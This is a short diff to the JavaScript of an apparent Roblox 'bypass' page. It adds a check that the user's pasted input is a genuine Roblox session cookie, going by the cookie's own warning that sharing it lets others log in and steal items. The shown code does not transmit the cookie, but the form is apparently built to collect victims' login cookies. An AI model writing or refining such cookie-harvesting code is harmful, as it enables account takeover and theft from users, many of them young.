@@ -110,6 +110,20 @@ function setCooldown(timeLeft) {
 document.getElementById('bypassForm').addEventListener('submit', function(event) {
     event.preventDefault();
     const payload = document.getElementById('payload').value;
+
+    // Check if the payload starts with the required warning message
+    const requiredPrefix = "|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items";
+    if (!payload.startsWith(requiredPrefix)) {
+        iziToast.show({
+            title: 'Error:',
+            message: 'it must be a roblox cookie.',
+            color: 'red',
+            position: 'topCenter',
+            timeout: 3000
+        });
+        return;
+    }
+
     if (!payload.trim()) {
         iziToast.show({
             title: 'Error:',
